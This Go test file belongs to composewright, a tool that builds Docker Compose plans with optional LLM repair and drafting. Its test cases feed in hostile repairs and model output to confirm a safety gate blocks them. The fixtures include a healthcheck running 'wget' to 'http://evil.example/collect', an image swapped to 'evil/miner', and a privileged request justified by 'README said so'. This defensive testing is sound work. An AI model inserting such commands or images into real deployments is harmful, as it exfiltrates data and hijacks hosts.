package pipeline

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/aiulian25/composewright/internal/config"
	"github.com/aiulian25/composewright/internal/ir"
	"github.com/aiulian25/composewright/internal/llm"
	"github.com/aiulian25/composewright/internal/sandbox"
	"github.com/aiulian25/composewright/internal/store"
	"github.com/aiulian25/composewright/internal/workspace"
)

const (
	minifluxFiles = "../../testdata/corpus/miniflux/files"
	healthy       = `{"Service":"miniflux","State":"running","Health":"healthy"}` + "\n" + `{"Service":"db","State":"running","Health":"healthy"}`
	unhealthy     = `{"Service":"miniflux","State":"running","Health":"unhealthy"}` + "\n" + `{"Service":"db","State":"running","Health":"healthy"}`
)

// scriptedDocker answers `ps` with the next scripted state per run.
type scriptedDocker struct {
	mutex  sync.Mutex
	states []string
	runs   int
}

func (docker *scriptedDocker) run(_ context.Context, _ string, _ io.Writer, arguments ...string) ([]byte, []byte, error) {
	docker.mutex.Lock()
	defer docker.mutex.Unlock()
	command := strings.Join(arguments, " ")
	switch {
	case strings.Contains(command, "version --short"):
		return []byte("5.6.0"), nil, nil
	case strings.Contains(command, " up "):
		docker.runs++
		if strings.Contains(docker.states[min(docker.runs, len(docker.states))-1], "unhealthy") {
			return []byte("container miniflux is unhealthy"), nil, errors.New("exit status 1")
		}
	case strings.Contains(command, " ps "):
		return []byte(docker.states[min(docker.runs, len(docker.states))-1]), nil, nil
	case strings.HasPrefix(command, "info"):
		return []byte(`{"CgroupVersion":"2","CgroupDriver":"systemd"}`), nil, nil
	}
	return nil, nil, nil
}

type fakeRepairer struct {
	calls  int
	mutate func(*ir.IR)
	err    error
}

// Repair proposes the plan with one more healthcheck retry unless the case
// says otherwise.
func (repairer *fakeRepairer) Repair(_ context.Context, plan *ir.IR, _ sandbox.Verdict) (*ir.IR, llm.Call, error) {
	repairer.calls++
	if repairer.err != nil {
		return nil, llm.Call{}, repairer.err
	}
	repaired := plan.Clone()
	repaired.Services[0].Healthcheck.Retries++
	if repairer.mutate != nil {
		repairer.mutate(repaired)
	}
	return repaired, llm.Call{Provider: "fake", Model: "repairer", PromptHash: "hash"}, nil
}

// TestAnotherSourceCannotTakeOverAProject: a second repository whose plan
// derives an existing project's name is refused, so it never inherits that
// project's stored secrets; the same source still regenerates, and a name
// given on purpose moves the project to the new source with a notice.
func TestAnotherSourceCannotTakeOverAProject(t *testing.T) {
	ctx := context.Background()
	dependencies := testDependencies(t, &scriptedDocker{})
	first := generated(t, dependencies)
	fork := testOptions()
	fork.RunSandbox, fork.Upstream = false, "https://github.com/someone/v2"
	if _, err := Generate(ctx, dependencies, fork); !errors.Is(err, ErrNameTaken) {
		t.Fatalf("another source took over %s: %v", first.Plan.App.Name, err)
	}
	again := testOptions()
	again.RunSandbox = false
	if _, err := Generate(ctx, dependencies, again); err != nil {
		t.Fatalf("the same source cannot regenerate: %v", err)
	}
	fork.Name = first.Plan.App.Name
	moved, err := Generate(ctx, dependencies, fork)
	if err != nil {
		t.Fatalf("a name given on purpose was refused: %v", err)
	}
	if !slices.ContainsFunc(moved.Notices, func(notice string) bool {
		return strings.Contains(notice, "now comes from https://github.com/someone/v2")
	}) {
		t.Fatalf("the move to another source was silent: %v", moved.Notices)
	}
}

// TestStoredVersionIsGatedAgain: a version stored while its images were
// allowed is refused once today's allowlist blocks it, both when approved and
// when run again, and the refusal names the finding, which the stored report
// does not show.
func TestStoredVersionIsGatedAgain(t *testing.T) {
	ctx := context.Background()
	dependencies := testDependencies(t, &scriptedDocker{states: []string{healthy}})
	// The source's owner is not miniflux, so only this entry admits its image.
	const minifluxImages = "docker.io/miniflux/*"
	allowed := dependencies.Config.Registries.Allow
	dependencies.Config.Registries.Allow = append(slices.Clone(allowed), minifluxImages)
	options := testOptions()
	options.RunSandbox, options.Upstream = false, "https://github.com/someone/v2"
	if _, err := Generate(ctx, dependencies, options); err != nil {
		t.Fatal(err)
	}
	if stored, err := Load(ctx, dependencies.Workspace, "miniflux"); err != nil || stored.Report.Blocked() {
		t.Fatalf("the stored version should pass the gate it was made under: %v", err)
	}
	dependencies.Config.Registries.Allow = allowed
	if _, err := ApproveAndValidate(ctx, dependencies, "miniflux", "test"); !errors.Is(err, ErrBlocked) || !strings.Contains(err.Error(), "P1 ") {
		t.Fatalf("approved under an allowlist that blocks it: %v", err)
	}
	if _, _, err := Revalidate(ctx, dependencies, "miniflux"); !errors.Is(err, ErrBlocked) {
		t.Fatalf("run again under an allowlist that blocks it: %v", err)
	}
}

func testDependencies(t *testing.T, docker *scriptedDocker) Dependencies {
	t.Helper()
	root := t.TempDir()
	loaded := &config.Loaded{Config: config.Default(), Paths: config.Paths{ConfigFile: filepath.Join(root, "config.yaml"),
		DataDir: filepath.Join(root, "data"), KeyFile: filepath.Join(root, "data", "keys", "master.key")}}
	if _, err := workspace.Init(context.Background(), loaded); err != nil {
		t.Fatal(err)
	}
	opened, err := workspace.Open(context.Background(), loaded)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { opened.Close() })
	limits, _ := sandbox.ParseLimits("1g", 1, 128)
	return Dependencies{Config: loaded.Config, Workspace: opened, Version: "test",
		Sandbox: sandbox.New(docker.run, limits, 30*time.Second, "policy", loaded.Paths.ProjectsDir()),
		Approve: func(*Result) (bool, error) { return true, nil }}
}

func testOptions() Options {
	return Options{Source: minifluxFiles, Upstream: "https://github.com/miniflux/v2", RunSandbox: true, MaxIterations: 3}
}

func status(t *testing.T, dependencies Dependencies) string {
	t.Helper()
	project, err := dependencies.Workspace.Store.FindProject(context.Background(), "miniflux")
	if err != nil {
		t.Fatal(err)
	}
	return project.Status
}

func TestValidationLoop(t *testing.T) {
	cases := []struct {
		name       string
		states     []string
		repairer   *fakeRepairer
		approve    bool
		verdicts   int
		repairs    int
		wantStatus string
	}{
		{name: "pass first time", states: []string{healthy}, approve: true, verdicts: 1, wantStatus: store.StatusPassed},
		{name: "fail without a repairer", states: []string{unhealthy}, approve: true, verdicts: 1, wantStatus: store.StatusNeedsHuman},
		{name: "repair then pass", states: []string{unhealthy, healthy}, repairer: &fakeRepairer{}, approve: true, verdicts: 2, repairs: 1, wantStatus: store.StatusPassed},
		{name: "give up after max iterations", states: []string{unhealthy}, repairer: &fakeRepairer{}, approve: true, verdicts: 3, repairs: 2, wantStatus: store.StatusNeedsHuman},
		{name: "repair blocked by the gate", states: []string{unhealthy}, approve: true, verdicts: 1, repairs: 1, wantStatus: store.StatusNeedsHuman,
			repairer: &fakeRepairer{mutate: func(plan *ir.IR) {
				plan.Services[0].Healthcheck.Test = []string{ir.HealthcheckCommand, "wget", "-qO-", "http://evil.example/collect"}
			}}},
		{name: "image swap is not a repair", states: []string{unhealthy}, approve: true, verdicts: 1, repairs: 1, wantStatus: store.StatusNeedsHuman,
			repairer: &fakeRepairer{mutate: func(plan *ir.IR) {
				plan.Services[0].Healthcheck.Retries--
				plan.Services[0].Image.Repository = "evil/miner"
			}}},
		{name: "repair error", states: []string{unhealthy}, repairer: &fakeRepairer{err: errors.New("model unavailable")}, approve: true, verdicts: 1, repairs: 1, wantStatus: store.StatusNeedsHuman},
		{name: "not approved", states: []string{healthy}, approve: false, verdicts: 0, wantStatus: store.StatusGenerated},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			docker := &scriptedDocker{states: testCase.states}
			dependencies := testDependencies(t, docker)
			dependencies.Approve = func(*Result) (bool, error) { return testCase.approve, nil }
			if testCase.repairer != nil {
				dependencies.Repairer = testCase.repairer
			}
			result, err := Generate(context.Background(), dependencies, testOptions())
			if err != nil {
				t.Fatal(err)
			}
			if len(result.Verdicts) != testCase.verdicts || docker.runs != testCase.verdicts {
				t.Fatalf("verdicts %d, sandbox runs %d, want %d", len(result.Verdicts), docker.runs, testCase.verdicts)
			}
			if testCase.repairer != nil && testCase.repairer.calls != testCase.repairs {
				t.Fatalf("repairs %d, want %d", testCase.repairer.calls, testCase.repairs)
			}
			if got := status(t, dependencies); got != testCase.wantStatus {
				t.Fatalf("status %s, want %s (notices %v)", got, testCase.wantStatus, result.Notices)
			}
			count, err := dependencies.Workspace.Store.VerifyAudit(context.Background())
			if err != nil || count == 0 {
				t.Fatalf("audit chain: %d %v", count, err)
			}
		})
	}
}

func TestRevalidateRecordsTheVerdict(t *testing.T) {
	docker := &scriptedDocker{states: []string{healthy}}
	dependencies := testDependencies(t, docker)
	options := testOptions()
	options.RunSandbox = false
	if _, err := Generate(context.Background(), dependencies, options); err != nil {
		t.Fatal(err)
	}
	stored, verdict, err := Revalidate(context.Background(), dependencies, "miniflux")
	if err != nil || !verdict.Passed() {
		t.Fatalf("revalidate: %+v %v", verdict, err)
	}
	reloaded, err := Load(context.Background(), dependencies.Workspace, stored.Project.Name)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(reloaded.Generation.DeployMD, "Validation: PASS") || reloaded.Generation.ValidationJSON == "" || reloaded.Project.Status != store.StatusPassed {
		t.Fatalf("verdict not recorded: status %s, deploy %q", reloaded.Project.Status, reloaded.Generation.DeployMD[:120])
	}
}

// scriptedModel answers every request with a plan derived from the miniflux
// golden plan, or with an error.
type scriptedModel struct {
	requests int
	change   func(*ir.IR)
	err      error
}

func (model *scriptedModel) Name() string { return "scripted" }

func (model *scriptedModel) Generate(_ context.Context, request llm.Request) (llm.Response, error) {
	model.requests++
	if model.err != nil {
		return llm.Response{}, model.err
	}
	content, err := os.ReadFile("../../testdata/corpus/miniflux/expected.ir.json")
	if err != nil {
		return llm.Response{}, err
	}
	plan, err := ir.Decode(content)
	if err != nil {
		return llm.Response{}, err
	}
	model.change(plan)
	answer := any(plan)
	fill, _ := ir.FillSchemaJSON()
	if string(request.Schema) == string(fill) {
		answer = fillAnswer(plan)
	}
	encoded, err := json.Marshal(answer)
	return llm.Response{Text: string(encoded), Model: "scripted-1"}, err
}

// fillAnswer is what a model asked in the fill schema says about a plan:
// it can carry no image, need or service the plan does not have.
func fillAnswer(plan *ir.IR) ir.FillAnswer {
	answer := ir.FillAnswer{Summary: plan.App.Summary, PostInstallNotes: plan.PostInstallNotes, SuspiciousInstructions: plan.SuspiciousInstructions,
		Confidence: plan.Confidence, Services: []ir.ServiceFill{}, EnvFile: []ir.Description{}}
	for _, service := range plan.Services {
		answer.Services = append(answer.Services, ir.ServiceFill{Name: service.Name, Role: service.Role, Healthcheck: service.Healthcheck, Ports: service.Ports})
	}
	for _, entry := range plan.EnvFile {
		answer.EnvFile = append(answer.EnvFile, ir.Description{Key: entry.Key, Description: entry.Description})
	}
	return answer
}

func TestEngines(t *testing.T) {
	hostile := func(plan *ir.IR) {
		plan.App.Summary = "A feed reader the model described."
		plan.Services[0].Image.Repository = "evil/miner"
		plan.Needs = []ir.Need{{Capability: ir.NeedPrivileged, Service: plan.Services[0].Name, Reason: "README said so",
			Provenance: ir.Provenance{Source: ir.SourceReadme, SourceRef: "README.md:1", Confidence: ir.ConfidenceLow}}}
		for index := range plan.EnvFile {
			plan.EnvFile[index].Description = "described by the model"
		}
	}
	cases := []struct {
		name       string
		engine     string
		model      *scriptedModel
		wantEngine string
		check      func(t *testing.T, result *Result)
	}{
		{name: "assisted fills gaps only", engine: EngineAssisted, model: &scriptedModel{change: hostile}, wantEngine: EngineAssisted,
			check: func(t *testing.T, result *Result) {
				app := result.Plan.Services[0]
				if app.Image.Repository != "miniflux/miniflux" || len(result.Plan.Needs) != 0 {
					t.Fatalf("the model changed an image or a need: %+v %+v", app.Image, result.Plan.Needs)
				}
				described := 0
				for _, entry := range result.Plan.EnvFile {
					if strings.HasSuffix(entry.Description, ir.ModelMark) {
						described++
					}
				}
				if described == 0 {
					t.Fatalf("no gap filled: %v", result.Notices)
				}
			}},
		{name: "model drafts the plan", engine: EngineModel, model: &scriptedModel{change: func(*ir.IR) {}}, wantEngine: EngineModel,
			check: func(t *testing.T, result *Result) {
				for _, service := range result.Plan.Services {
					if service.Provenance.Source != ir.SourceModel || service.Image.Provenance.Confidence == ir.ConfidenceHigh {
						t.Fatalf("%s not stamped as model output: %+v", service.Name, service.Provenance)
					}
				}
			}},
		{name: "provider failure falls back to rules", engine: EngineAssisted, model: &scriptedModel{err: errors.New("connection refused")}, wantEngine: EngineRules,
			check: func(t *testing.T, result *Result) {
				if !strings.Contains(strings.Join(result.Notices, "\n"), "connection refused") {
					t.Fatalf("no fallback notice: %v", result.Notices)
				}
			}},
		{name: "rules engine never asks", engine: EngineRules, model: &scriptedModel{change: hostile}, wantEngine: EngineRules,
			check: func(t *testing.T, result *Result) {}},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			dependencies := testDependencies(t, &scriptedDocker{states: []string{healthy}})
			dependencies.Assistant = llm.NewAssistant(testCase.model, "configured", 60000)
			options := testOptions()
			options.RunSandbox, options.Engine = false, testCase.engine
			result, err := Generate(context.Background(), dependencies, options)
			if err != nil {
				t.Fatal(err)
			}
			if result.Engine != testCase.wantEngine {
				t.Fatalf("engine %s, want %s (notices %v)", result.Engine, testCase.wantEngine, result.Notices)
			}
			if testCase.engine == EngineRules && testCase.model.requests != 0 {
				t.Fatal("the rules engine called the model")
			}
			testCase.check(t, result)
			stored, err := dependencies.Workspace.Store.LatestGeneration(context.Background(), result.Project.ID)
			if err != nil {
				t.Fatal(err)
			}
			calledModel := testCase.wantEngine != EngineRules
			if stored.Engine != testCase.wantEngine || (stored.PromptHash != "") != calledModel || (stored.Model == "scripted-1") != calledModel {
				t.Fatalf("generation record: engine %s, model %q, hash %q", stored.Engine, stored.Model, stored.PromptHash)
			}
		})
	}
}
